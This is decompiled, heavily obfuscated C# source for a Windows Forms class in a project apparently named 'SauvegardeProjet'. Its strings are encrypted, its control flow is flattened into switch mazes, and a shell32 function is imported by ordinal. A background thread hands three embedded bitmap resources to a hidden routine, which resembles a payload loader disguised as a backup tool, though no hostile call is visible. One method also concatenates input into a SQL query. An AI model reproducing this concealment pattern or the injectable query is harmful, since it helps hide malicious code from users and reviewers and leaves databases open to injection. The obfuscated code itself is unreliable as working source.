using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using SauvegardeProjet.My.Resources;

[DesignerGenerated]
public class GForm0 : Form
{
	private List<string> list_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႩ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button button_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႪ")]
	[CompilerGenerated]
	private OpenFileDialog openFileDialog_0;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႫ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label label_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႬ")]
	private Label label_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႭ")]
	private Label label_2;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႮ")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label label_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႯ")]
	[CompilerGenerated]
	private Label label_4;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႰ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label label_5;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႱ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label label_6;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႲ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label label_7;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႳ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ListBox listBox_0;

	[AccessedThroughProperty("ႹკႨცჰႴჾკჽႴ")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label label_8;

	internal virtual Button Button_0
	{
		[CompilerGenerated]
		get
		{
			return button_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_3;
			Button val = button_0;
			if (val != null || 1 == 0)
			{
				Delegate157.smethod_0(val, eventHandler_);
			}
			button_0 = value;
			while (true)
			{
				int num = Class5.smethod_0(5);
				int num2 = 8;
				while (true)
				{
					num2 ^= Class43.smethod_0(104);
					while (true)
					{
						int num3 = Class43.smethod_0(30);
						while (true)
						{
							switch (num3 ^ Class43.smethod_0(97))
							{
							case 41:
								break;
							case 40:
								goto IL_0042;
							case 39:
								num3 = 9;
								continue;
							default:
								goto end_IL_00a7;
							case 42:
								goto end_IL_00cd;
							}
							goto IL_0030;
							IL_0042:
							switch (num2)
							{
							case 35:
								goto IL_0060;
							case 36:
								goto IL_0097;
							case 33:
								goto IL_00d8;
							case 34:
								goto end_IL_00e5;
							}
							num3 = 7;
							continue;
							IL_00d8:
							num2 = 13;
							goto end_IL_00cd;
							IL_0060:
							switch (num)
							{
							case -42:
								break;
							case -41:
								if (val != null)
								{
									goto IL_008a;
								}
								if (true)
								{
									return;
								}
								goto case -39;
							case -40:
								goto IL_0094;
							default:
								goto IL_00dd;
							case -39:
								Delegate158.smethod_0(val, eventHandler_);
								return;
							}
							val = button_0;
							num = -13;
							goto IL_0097;
							IL_00dd:
							num2 = Class43.smethod_0(74);
							goto end_IL_00cd;
							IL_0094:
							num = -4;
							goto IL_0097;
							IL_008a:
							num = Class35.smethod_0(13);
							goto IL_0097;
							IL_0030:
							num2 = Class43.smethod_0(75);
							num3 = Class43.smethod_0(8);
							continue;
							IL_0097:
							num ^= Class43.smethod_0(101);
							goto IL_0030;
							continue;
							end_IL_00a7:
							break;
						}
						continue;
						end_IL_00cd:
						break;
					}
					continue;
					end_IL_00e5:
					break;
				}
			}
		}
	}

	internal virtual OpenFileDialog OpenFileDialog_0
	{
		[CompilerGenerated]
		get
		{
			return openFileDialog_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			openFileDialog_0 = value;
		}
	}

	internal virtual Label Label_0
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label Label_1
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual Label Label_2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	internal virtual Label Label_3
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	internal virtual Label Label_4
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	internal virtual Label Label_5
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Label Label_6
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	internal virtual Label Label_7
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual ListBox ListBox_0
	{
		[CompilerGenerated]
		get
		{
			return listBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			listBox_0 = value;
		}
	}

	internal virtual Label Label_8
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	public GForm0()
	{
		while (true)
		{
			int num = Class43.smethod_0(1);
			while (true)
			{
				switch (num ^ Class43.smethod_0(81))
				{
				case 37:
					method_7();
					num = 5;
					continue;
				case 36:
					num = 7;
					continue;
				case 35:
				{
					List<string> object_ = Delegate41.smethod_0();
					Delegate42.smethod_0(object_, Class41.smethod_0(27365));
					Delegate42.smethod_0(object_, Class41.smethod_0(27369));
					Delegate42.smethod_0(object_, Class41.smethod_0(27373));
					Delegate42.smethod_0(object_, Class41.smethod_0(27377));
					Delegate42.smethod_0(object_, Class41.smethod_0(27385));
					list_0 = object_;
					num = 4;
					continue;
				}
				case 34:
					num = 2;
					continue;
				case 33:
					num = 0;
					continue;
				case 32:
					Delegate40.smethod_0(this, method_1);
					num = Class43.smethod_0(2);
					continue;
				case 38:
					return;
				}
				break;
			}
		}
	}

	[DllImport("shell32", EntryPoint = "#60")]
	private static extern int shell32_60(int int_0);

	public bool method_0(string string_6)
	{
		bool result = default(bool);
		try
		{
			FileStream object_ = Delegate43.smethod_0(string_6, (FileMode)Class43.smethod_0(2), (FileAccess)Class43.smethod_0(1), (FileShare)Class43.smethod_0(1));
			bool flag = default(bool);
			byte[] array = default(byte[]);
			while (true)
			{
				int num = Class43.smethod_0(7);
				while (true)
				{
					switch (num ^ Class43.smethod_0(40))
					{
					case 34:
						Delegate44.smethod_0(object_, Class43.smethod_0(4), (SeekOrigin)Class43.smethod_0(0));
						num = Class43.smethod_0(30);
						continue;
					case 33:
						num = 61;
						continue;
					case 32:
						flag = (array[Class43.smethod_0(0)] == Class43.smethod_0(5)) & (array[Class43.smethod_0(1)] == Class43.smethod_0(6)) & (array[Class43.smethod_0(7)] == Class43.smethod_0(0)) & (array[Class43.smethod_0(2)] == Class43.smethod_0(0)) & (array[Class43.smethod_0(8)] == Class43.smethod_0(9));
						num = 1;
						continue;
					case 31:
						array = new byte[Class43.smethod_0(3)];
						num = 63;
						continue;
					case 30:
						Delegate46.smethod_0(object_);
						num = 60;
						continue;
					case 29:
						num = 0;
						continue;
					case 28:
						if (flag)
						{
							num = 62;
							continue;
						}
						if (true)
						{
							return result;
						}
						goto case 35;
					case 27:
						Delegate45.smethod_0(object_, array, Class43.smethod_0(0), Class43.smethod_0(3));
						num = 3;
						continue;
					case 35:
						result = (byte)Class43.smethod_0(1) != 0;
						return result;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			Delegate18.smethod_0(exception_);
			while (true)
			{
				int num2 = Class16.smethod_0(28);
				int num3 = -64;
				while (true)
				{
					num3 ^= Class43.smethod_0(88);
					while (true)
					{
						int num4 = Class5.smethod_0(14);
						int num5 = -8;
						while (true)
						{
							num5 ^= Class43.smethod_0(80);
							while (true)
							{
								int num6 = Class35.smethod_0(16);
								int num7 = -7;
								while (true)
								{
									num7 ^= Class43.smethod_0(79);
									while (true)
									{
										int num8 = Class43.smethod_0(2);
										int num9 = 2;
										while (true)
										{
											num9 ^= Class43.smethod_0(35);
											while (true)
											{
												IL_015f:
												int num10 = Class16.smethod_0(31);
												while (true)
												{
													switch (num10 ^ Class43.smethod_0(81))
													{
													case -25:
														break;
													default:
														goto IL_015f;
													case -27:
														goto IL_0190;
													case -26:
														goto IL_01db;
													case -28:
														num10 = -59;
														continue;
													}
													break;
													IL_0190:
													switch (num9)
													{
													case 31:
														break;
													case 32:
														goto IL_01ac;
													case 34:
														goto IL_01cf;
													default:
														goto IL_01ec;
													case 33:
														goto end_IL_0153;
													}
													num9 = 63;
													break;
													IL_01ec:
													num10 = -57;
													continue;
													IL_01ac:
													switch (num8)
													{
													case 23:
														break;
													case 24:
														goto IL_01f5;
													case 25:
														goto IL_033c;
													default:
														goto IL_0356;
													case 26:
														goto end_IL_0363;
													}
													num8 = 12;
													goto IL_01cf;
													IL_0356:
													num9 = Class43.smethod_0(1);
													break;
													IL_01f5:
													switch (num7)
													{
													case -28:
														goto IL_0219;
													case -27:
														goto IL_0330;
													case -29:
														goto IL_0373;
													case -30:
														goto end_IL_037c;
													}
													num8 = Class43.smethod_0(7);
													goto IL_01cf;
													IL_0373:
													num7 = -1;
													goto end_IL_0363;
													IL_0219:
													switch (num6)
													{
													case -27:
														break;
													case -25:
														goto IL_0241;
													case -26:
														goto IL_0324;
													default:
														goto IL_0378;
													case -24:
														goto end_IL_038a;
													}
													num6 = -14;
													goto IL_0330;
													IL_0378:
													num7 = -2;
													goto end_IL_0363;
													IL_0241:
													switch (num5)
													{
													case -32:
														goto IL_0269;
													case -31:
														goto IL_0318;
													case -33:
														goto IL_0399;
													case -34:
														goto end_IL_03a3;
													}
													num6 = Class35.smethod_0(12);
													goto IL_0330;
													IL_0399:
													num5 = -58;
													goto end_IL_038a;
													IL_0269:
													switch (num4)
													{
													case -27:
														break;
													case -25:
														goto IL_0291;
													case -26:
														goto IL_030b;
													default:
														goto IL_039f;
													case -24:
														goto end_IL_03b1;
													}
													num4 = -2;
													goto IL_0318;
													IL_039f:
													num5 = -57;
													goto end_IL_038a;
													IL_0291:
													switch (num3)
													{
													case -36:
														goto IL_02b6;
													case -34:
														goto IL_02ff;
													case -37:
														goto IL_03c0;
													case -35:
														goto end_IL_03ca;
													}
													num4 = Class35.smethod_0(13);
													goto IL_0318;
													IL_03c0:
													num3 = -59;
													goto end_IL_03b1;
													IL_02b6:
													switch (num2)
													{
													case -24:
														break;
													case -23:
														goto IL_02e4;
													case -22:
														goto IL_02ea;
													case -21:
														goto IL_02fb;
													default:
														goto IL_03c6;
													case -20:
														return result;
													}
													Delegate47.smethod_0();
													num2 = -14;
													goto IL_02ff;
													IL_03c6:
													num3 = -61;
													goto end_IL_03b1;
													IL_02fb:
													num2 = -11;
													goto IL_02ff;
													IL_02ea:
													result = (byte)Class43.smethod_0(0) != 0;
													num2 = Class5.smethod_0(4);
													goto IL_02ff;
													IL_02e4:
													num2 = -12;
													goto IL_02ff;
													IL_033c:
													num7 = Class35.smethod_0(15);
													num8 = 1;
													goto IL_01cf;
													IL_02ff:
													num2 ^= Class43.smethod_0(88);
													goto IL_030b;
													IL_030b:
													num3 = Class16.smethod_0(37);
													num4 = -13;
													goto IL_0318;
													IL_01db:
													num9 = Class43.smethod_0(0);
													num10 = -58;
													continue;
													IL_01cf:
													num8 ^= Class43.smethod_0(89);
													goto IL_01db;
													IL_0318:
													num4 ^= Class43.smethod_0(89);
													goto IL_0324;
													IL_0324:
													num5 = Class35.smethod_0(10);
													num6 = -1;
													goto IL_0330;
													IL_0330:
													num6 ^= Class43.smethod_0(43);
													goto IL_033c;
												}
												break;
											}
											continue;
											end_IL_0153:
											break;
										}
										continue;
										end_IL_0363:
										break;
									}
									continue;
									end_IL_037c:
									break;
								}
								continue;
								end_IL_038a:
								break;
							}
							continue;
							end_IL_03a3:
							break;
						}
						continue;
						end_IL_03b1:
						break;
					}
					continue;
					end_IL_03ca:
					break;
				}
			}
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		string_2 = Class41.smethod_0(27390);
		string_3 = Class41.smethod_0(27394);
		if ((Class43.smethod_0(1) == 0) ? true : false)
		{
			_ = (object)Class43.smethod_0(2);
			try
			{
				Class43.smethod_0(10);
			}
			catch (Exception exception_)
			{
				Delegate18.smethod_0(exception_);
				while (true)
				{
					int num = Resources.smethod_0(40);
					int num2 = -13;
					while (true)
					{
						num2 ^= Class43.smethod_0(99);
						while (true)
						{
							int num3 = Class43.smethod_0(59);
							int num4 = 27;
							while (true)
							{
								num4 ^= Class43.smethod_0(98);
								while (true)
								{
									int num5 = Class35.smethod_0(15);
									int num6 = 15;
									while (true)
									{
										num6 ^= Class43.smethod_0(102);
										while (true)
										{
											IL_0115:
											int num7 = Class35.smethod_0(10);
											while (true)
											{
												switch (num7 ^ Class43.smethod_0(81))
												{
												case -39:
													break;
												default:
													goto IL_0115;
												case -40:
													goto IL_0146;
												case -42:
													goto IL_0212;
												case -41:
													num7 = Class5.smethod_0(4);
													continue;
												}
												break;
												IL_0146:
												switch (num6)
												{
												case 38:
													break;
												case 36:
													goto end_IL_0109;
												default:
													goto IL_0160;
												case 39:
													goto IL_0206;
												case 37:
													goto IL_0231;
												}
												switch (num5)
												{
												case -36:
													break;
												case -35:
													goto end_IL_00fc;
												case -38:
													goto IL_0166;
												case -37:
													goto IL_01fa;
												default:
													goto IL_023a;
												}
												switch (num4)
												{
												case 46:
													break;
												case 45:
													goto end_IL_00f0;
												default:
													goto IL_016f;
												case 48:
													goto IL_01ee;
												case 47:
													goto IL_024b;
												}
												switch (num3)
												{
												case 40:
													break;
												case 41:
													goto end_IL_00e3;
												case 39:
													goto IL_0177;
												case 38:
													goto IL_01e2;
												default:
													goto IL_0243;
												}
												switch (num2)
												{
												case -42:
													break;
												default:
													goto IL_0181;
												case -40:
													goto IL_0186;
												case -39:
													goto IL_01d6;
												case -41:
													goto end_IL_00d7;
												}
												num2 = -4;
												goto end_IL_00e3;
												IL_0231:
												num6 = 13;
												break;
												IL_0160:
												num7 = -9;
												continue;
												IL_0181:
												num3 = 4;
												goto IL_01ee;
												IL_023a:
												num6 = 12;
												break;
												IL_0166:
												num5 = -2;
												goto IL_0206;
												IL_01ee:
												num3 ^= Class43.smethod_0(85);
												goto IL_01fa;
												IL_024b:
												num4 = 4;
												goto end_IL_00fc;
												IL_016f:
												num5 = -1;
												goto IL_0206;
												IL_01fa:
												num4 = Class43.smethod_0(3);
												num5 = -7;
												goto IL_0206;
												IL_0243:
												num4 = 6;
												goto end_IL_00fc;
												IL_0177:
												num3 = Class43.smethod_0(3);
												goto IL_01ee;
												IL_0206:
												num5 ^= Class43.smethod_0(101);
												goto IL_0212;
												IL_0186:
												switch (num)
												{
												case -34:
													break;
												case -33:
													goto IL_01b4;
												case -32:
													goto IL_01c7;
												case -31:
													goto IL_01cd;
												default:
													goto IL_0253;
												case -30:
													goto end_IL_025c;
												}
												num = Class16.smethod_0(28);
												goto IL_01d6;
												IL_0253:
												num2 = -3;
												goto end_IL_00e3;
												IL_01cd:
												Delegate47.smethod_0();
												num = -53;
												goto IL_01d6;
												IL_01c7:
												num = -10;
												goto IL_01d6;
												IL_01b4:
												_ = (object)Class43.smethod_0(11);
												num = -56;
												goto IL_01d6;
												IL_0212:
												num6 = Class43.smethod_0(74);
												num7 = -8;
												continue;
												IL_01d6:
												num ^= Class43.smethod_0(95);
												goto IL_01e2;
												IL_01e2:
												num2 = Class5.smethod_0(5);
												num3 = 11;
												goto IL_01ee;
											}
											break;
										}
										continue;
										end_IL_0109:
										break;
									}
									continue;
									end_IL_00fc:
									break;
								}
								continue;
								end_IL_00f0:
								break;
							}
							continue;
							end_IL_00e3:
							break;
						}
						continue;
						end_IL_00d7:
						break;
					}
					continue;
					end_IL_025c:
					break;
				}
			}
		}
		while (true)
		{
			int num8 = Class43.smethod_0(73);
			while (true)
			{
				ThreadStart threadStart_;
				Thread object_;
				switch (num8 ^ Class43.smethod_0(96))
				{
				case 42:
				case 50:
					num8 = 14;
					continue;
				case 49:
					Class43.smethod_0(0);
					num8 = 12;
					continue;
				case 48:
					Class43.smethod_0(15);
					num8 = 9;
					continue;
				case 47:
					Class43.smethod_0(16);
					num8 = 8;
					continue;
				case 46:
					if (_Closure_0024__._0024I10_002D0 != null)
					{
						num8 = 21;
						continue;
					}
					if (1 == 0)
					{
						goto case 51;
					}
					threadStart_ = (_Closure_0024__._0024I10_002D0 = delegate
					{
						Class43.smethod_0(1);
						Delegate160.smethod_0(Delegate159.smethod_0());
						Class43.smethod_0(62);
						Class43.smethod_0(63);
						Class43.smethod_0(64);
						while (true)
						{
							int num14 = Class35.smethod_0(13);
							int num15 = 7;
							while (true)
							{
								switch (num15 ^ Class43.smethod_0(94))
								{
								case 42:
									num14 ^= Class43.smethod_0(81);
									goto default;
								default:
									num15 = Class43.smethod_0(59);
									continue;
								case 41:
									num15 = 4;
									continue;
								case 39:
									switch (num14)
									{
									default:
										num15 = Class43.smethod_0(3);
										continue;
									case -36:
									{
										decimal num25 = new decimal((long)Class43.smethod_0(65));
										num14 = -2;
										break;
									}
									case -37:
									case -35:
										Class43.smethod_0(1);
										num14 = -63;
										break;
									case -34:
										num14 = -1;
										break;
									case -33:
									{
										decimal num24 = new decimal((long)Class43.smethod_0(66));
										num14 = Class5.smethod_0(14);
										break;
									}
									case -32:
										while (true)
										{
											int num16 = Class16.smethod_0(36);
											int num17 = -61;
											while (true)
											{
												num17 ^= Class43.smethod_0(85);
												while (true)
												{
													int num18 = Class5.smethod_0(9);
													int num19 = 10;
													while (true)
													{
														num19 ^= Class43.smethod_0(97);
														while (true)
														{
															int num20 = Class43.smethod_0(89);
															int num21 = -6;
															while (true)
															{
																num21 ^= Class43.smethod_0(100);
																while (true)
																{
																	int num22 = Class16.smethod_0(28);
																	int num23 = 5;
																	while (true)
																	{
																		switch (num23 ^ Class43.smethod_0(95))
																		{
																		case 44:
																			break;
																		default:
																			goto IL_0102;
																		case 43:
																			num23 = 2;
																			continue;
																		case 42:
																			goto IL_0117;
																		case 41:
																			goto end_IL_039a;
																		}
																		goto IL_00f6;
																		IL_0117:
																		switch (num22)
																		{
																		case -34:
																			goto IL_013e;
																		case -35:
																			goto IL_037f;
																		case -33:
																			goto IL_0391;
																		case -32:
																			goto end_IL_03c5;
																		}
																		num23 = Class43.smethod_0(0);
																		continue;
																		IL_0391:
																		num22 = -10;
																		goto IL_00f6;
																		IL_013e:
																		switch (num21)
																		{
																		case -38:
																			goto IL_015e;
																		case -35:
																			goto IL_0373;
																		case -37:
																			goto IL_03d9;
																		case -36:
																			goto end_IL_03dd;
																		}
																		num22 = -12;
																		goto IL_00f6;
																		IL_03d9:
																		num21 = -4;
																		goto end_IL_03c5;
																		IL_015e:
																		switch (num20)
																		{
																		case 48:
																			break;
																		case 47:
																			goto IL_0360;
																		case 49:
																			goto IL_036f;
																		default:
																			goto IL_03d3;
																		case 50:
																			goto end_IL_03eb;
																		}
																		switch (num19)
																		{
																		case 33:
																			goto IL_019f;
																		case 36:
																			goto IL_0354;
																		case 34:
																			goto IL_0400;
																		case 35:
																			goto end_IL_0409;
																		}
																		num20 = 4;
																		goto IL_0373;
																		IL_03d3:
																		num21 = -5;
																		goto end_IL_03c5;
																		IL_036f:
																		num20 = 26;
																		goto IL_0373;
																		IL_037f:
																		num21 = Class35.smethod_0(13);
																		num22 = -55;
																		goto IL_00f6;
																		IL_0400:
																		num19 = Class43.smethod_0(41);
																		goto end_IL_03eb;
																		IL_019f:
																		switch (num18)
																		{
																		case -46:
																			break;
																		case -44:
																			goto IL_01c7;
																		case -45:
																			goto IL_0347;
																		default:
																			goto IL_03fa;
																		case -43:
																			goto end_IL_0417;
																		}
																		num18 = -4;
																		goto IL_0354;
																		IL_03fa:
																		num19 = 13;
																		goto end_IL_03eb;
																		IL_01c7:
																		switch (num17)
																		{
																		case -34:
																			goto IL_01ea;
																		case -31:
																			goto IL_033b;
																		case -32:
																			goto IL_042c;
																		case -33:
																			goto end_IL_0435;
																		}
																		num18 = -3;
																		goto IL_0354;
																		IL_042c:
																		num17 = Class16.smethod_0(37);
																		goto end_IL_0417;
																		IL_01ea:
																		switch (num16)
																		{
																		case -29:
																			break;
																		case -28:
																			goto IL_0257;
																		case -30:
																		case -27:
																			goto IL_0274;
																		case -26:
																			goto IL_0285;
																		case -25:
																			goto IL_0296;
																		case -24:
																			goto IL_02b1;
																		case -23:
																			goto IL_02ba;
																		case -22:
																			goto IL_02cd;
																		case -21:
																			goto IL_02da;
																		case -20:
																			goto IL_02e7;
																		case -19:
																			goto IL_02ed;
																		case -18:
																			goto IL_02fb;
																		case -16:
																			goto IL_0308;
																		case -15:
																			goto IL_030e;
																		case -14:
																			goto IL_031b;
																		case -13:
																			goto IL_0329;
																		case -12:
																			goto IL_0337;
																		default:
																			goto IL_0426;
																		case -17:
																		case -11:
																			return;
																		}
																		Delegate52.smethod_0();
																		num16 = -1;
																		goto IL_033b;
																		IL_0426:
																		num17 = -3;
																		goto end_IL_0417;
																		IL_0337:
																		num16 = -5;
																		goto IL_033b;
																		IL_0329:
																		Class43.smethod_0(67);
																		num16 = -17;
																		goto IL_033b;
																		IL_031b:
																		Class43.smethod_0(19);
																		num16 = -11;
																		goto IL_033b;
																		IL_030e:
																		Class43.smethod_3(5);
																		num16 = -14;
																		goto IL_033b;
																		IL_0308:
																		num16 = -9;
																		goto IL_033b;
																		IL_02fb:
																		Class43.smethod_0(1);
																		num16 = -20;
																		goto IL_033b;
																		IL_02ed:
																		Class43.smethod_0(68);
																		num16 = -6;
																		goto IL_033b;
																		IL_02e7:
																		num16 = -15;
																		goto IL_033b;
																		IL_02da:
																		Class43.smethod_3(4);
																		num16 = -2;
																		goto IL_033b;
																		IL_02cd:
																		Class43.smethod_0(1);
																		num16 = -10;
																		goto IL_033b;
																		IL_02ba:
																		_ = (object)Class43.smethod_0(72);
																		num16 = -13;
																		goto IL_033b;
																		IL_02b1:
																		num16 = -16;
																		goto IL_033b;
																		IL_0296:
																		_ = (object)Class43.smethod_0(69);
																		num16 = Class35.smethod_0(10);
																		goto IL_033b;
																		IL_0285:
																		Class43.smethod_0(71);
																		num16 = -12;
																		goto IL_033b;
																		IL_0274:
																		Class43.smethod_0(70);
																		num16 = -23;
																		goto IL_033b;
																		IL_0257:
																		smethod_0(Resources.Bitmap_0, Resources.Bitmap_1, Resources.Bitmap_2);
																		num16 = -19;
																		goto IL_033b;
																		IL_0102:
																		num23 = Class43.smethod_0(2);
																		continue;
																		IL_033b:
																		num16 ^= Class43.smethod_0(40);
																		goto IL_0347;
																		IL_0347:
																		num17 = Class5.smethod_0(14);
																		num18 = -5;
																		goto IL_0354;
																		IL_00f6:
																		num22 ^= Class43.smethod_0(95);
																		goto IL_0102;
																		IL_0373:
																		num20 ^= Class43.smethod_0(98);
																		goto IL_037f;
																		IL_0354:
																		num18 ^= Class43.smethod_0(97);
																		goto IL_0360;
																		IL_0360:
																		num19 = Class43.smethod_0(75);
																		num20 = 25;
																		goto IL_0373;
																		continue;
																		end_IL_039a:
																		break;
																	}
																	continue;
																	end_IL_03c5:
																	break;
																}
																continue;
																end_IL_03dd:
																break;
															}
															continue;
															end_IL_03eb:
															break;
														}
														continue;
														end_IL_0409:
														break;
													}
													continue;
													end_IL_0417:
													break;
												}
												continue;
												end_IL_0435:
												break;
											}
										}
									}
									goto case 42;
								case 40:
									break;
								}
								break;
							}
						}
					});
					goto IL_0369;
				case 45:
					Class43.smethod_0(12);
					num8 = 10;
					continue;
				case 44:
					Class43.smethod_0(13);
					num8 = 1;
					continue;
				case 40:
				case 43:
					Class43.smethod_0(1);
					num8 = 22;
					continue;
				case 41:
					num8 = 15;
					continue;
				case 39:
					_ = (object)Class43.smethod_0(14);
					num8 = 23;
					continue;
				case 51:
					{
						threadStart_ = _Closure_0024__._0024I10_002D0;
						goto IL_0369;
					}
					IL_0369:
					object_ = Delegate48.smethod_0(threadStart_);
					while (true)
					{
						int num9 = Class16.smethod_0(46);
						while (true)
						{
							switch (num9 ^ Class43.smethod_0(89))
							{
							case -3:
								Delegate50.smethod_0(object_);
								num9 = -16;
								continue;
							case -4:
								Class43.smethod_0(1);
								num9 = -14;
								continue;
							case -5:
								Class43.smethod_0(17);
								num9 = -31;
								continue;
							case -6:
							{
								decimal num13 = new decimal((long)Class43.smethod_0(18));
								num9 = -11;
								continue;
							}
							case -7:
								num9 = -29;
								continue;
							case -8:
								num9 = -23;
								continue;
							case -9:
								num9 = -20;
								continue;
							case -10:
								Delegate52.smethod_0();
								num9 = -17;
								continue;
							case -11:
								_ = (object)Class43.smethod_0(23);
								num9 = -13;
								continue;
							case -17:
							case -12:
								Class43.smethod_0(24);
								num9 = -27;
								continue;
							case -13:
								Class43.smethod_0(20);
								num9 = -25;
								continue;
							case -14:
								Class43.smethod_0(2);
								num9 = -22;
								continue;
							case -15:
								num9 = -10;
								continue;
							case -16:
								Class43.smethod_3(1);
								num9 = -15;
								continue;
							case -18:
								Class43.smethod_0(19);
								num9 = -24;
								continue;
							case -19:
								Class43.smethod_0(22);
								num9 = Class16.smethod_0(36);
								continue;
							case -20:
								Class43.smethod_3(0);
								num9 = -30;
								continue;
							case -21:
								num9 = -21;
								continue;
							case -22:
								Delegate51.smethod_0();
								num9 = -19;
								continue;
							case -23:
								Delegate49.smethod_0(Class43.smethod_0(21));
								num9 = -9;
								continue;
							case -24:
								Class43.smethod_0(1);
								num9 = -26;
								continue;
							case -2:
								Class43.smethod_0(1);
								while (true)
								{
									int num10 = Class43.smethod_0(3);
									while (true)
									{
										switch (num10 ^ Class43.smethod_0(95))
										{
										case 49:
											Class43.smethod_3(2);
											num10 = 2;
											continue;
										case 48:
										{
											decimal num12 = new decimal((long)Class43.smethod_0(26));
											num10 = 4;
											continue;
										}
										case 47:
											num10 = Class43.smethod_0(30);
											continue;
										case 46:
											Class43.smethod_0(0);
											num10 = 27;
											continue;
										case 45:
											Class43.smethod_0(1);
											num10 = 24;
											continue;
										case 44:
											Class43.smethod_0(25);
											num10 = 25;
											continue;
										case 43:
											Delegate53.smethod_0(Class43.smethod_0(27));
											num10 = 7;
											continue;
										case 50:
										{
											Class43.smethod_0(28);
											decimal num11 = new decimal((long)Class43.smethod_0(29));
											return;
										}
										}
										break;
									}
								}
							}
							break;
						}
					}
				}
				break;
			}
		}
	}

	public string method_2(string string_6)
	{
		SqlConnection val = Delegate54.smethod_0(Class41.smethod_0(27398));
		try
		{
			string text = Delegate55.smethod_0(Class41.smethod_0(27415), string_6, Class41.smethod_0(27420));
			SqlCommand sqlCommand_ = default(SqlCommand);
			SqlDataAdapter object_ = default(SqlDataAdapter);
			string result = default(string);
			while (true)
			{
				int num = Class43.smethod_0(75);
				while (true)
				{
					switch (num ^ Class43.smethod_0(102))
					{
					case 39:
						sqlCommand_ = Delegate56.smethod_0(text, val);
						num = 13;
						continue;
					case 38:
						num = 14;
						continue;
					case 37:
						object_ = Delegate57.smethod_0(sqlCommand_);
						num = 0;
						continue;
					case 40:
					{
						DataSet dataSet = Delegate58.smethod_0();
						try
						{
							Delegate59.smethod_0(val);
							while (true)
							{
								int num2 = Class43.smethod_0(3);
								int num3 = Class35.smethod_0(15);
								while (true)
								{
									num3 ^= Class43.smethod_0(104);
									while (true)
									{
										int num4 = Class5.smethod_0(6);
										int num5 = 3;
										while (true)
										{
											switch (num5 ^ Class43.smethod_0(95))
											{
											case 42:
												break;
											default:
												goto IL_009b;
											case 41:
												num5 = 0;
												continue;
											case 40:
												goto IL_00b0;
											case 39:
												goto end_IL_01a8;
											}
											goto IL_008f;
											IL_00b0:
											switch (num4)
											{
											case -42:
												goto IL_00d8;
											case -41:
												goto IL_00e2;
											case -40:
												goto IL_0197;
											case -39:
												goto end_IL_01d3;
											}
											num5 = Class43.smethod_0(74);
											continue;
											IL_00e2:
											switch (num3)
											{
											case -45:
												goto IL_0102;
											case -44:
												goto IL_018b;
											case -46:
												goto IL_01e0;
											case -47:
												goto end_IL_01ea;
